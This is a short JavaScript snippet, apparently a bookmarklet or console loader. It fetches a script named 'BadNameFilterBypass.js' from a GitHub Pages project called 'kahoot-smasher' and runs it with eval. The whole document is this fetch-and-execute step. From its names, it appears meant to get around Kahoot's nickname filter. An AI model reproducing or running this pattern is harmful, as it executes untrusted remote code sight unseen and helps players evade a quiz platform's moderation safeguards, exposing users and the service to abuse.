(function () {
  fetch('https://thatfrueddued.github.io/kahoot-smasher/BadNameFilterBypass.js')
    .then(r => r.text())
    .then(code => eval(code));
})();
